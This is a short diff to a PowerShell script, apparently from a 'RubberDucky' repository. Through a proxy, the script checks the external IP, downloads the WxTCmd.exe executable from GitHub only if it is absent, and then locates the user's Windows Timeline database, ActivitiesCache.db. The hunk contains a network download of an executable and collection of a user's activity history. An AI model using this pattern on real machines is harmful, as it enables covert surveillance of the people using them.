@@ -10,7 +10,10 @@ try {
 	$d=curl -usebasicparsing -proxy $proxy "https://ifconfig.me"
 	Write-Host "IP: $d"
 }
-curl -usebasicparsing -proxy $proxy "https://raw.githubusercontent.com/jerfe/RubberDucky/main/WxTCmd.exe" -outfile "$workingfolder/WxTCmd.exe"
+if(-Not(test-path "$workingfolder/WxTCmd.exe"))
+{
+	curl -usebasicparsing -proxy $proxy "https://raw.githubusercontent.com/jerfe/RubberDucky/main/WxTCmd.exe" -outfile "$workingfolder/WxTCmd.exe"
+}
 $dbs = (gci "$($env:LOCALAPPDATA)\ConnectedDevicesPlatform" -recurse -Include 'ActivitiesCache.db').FullName 
 if($dbs.count -eq 0)
 {
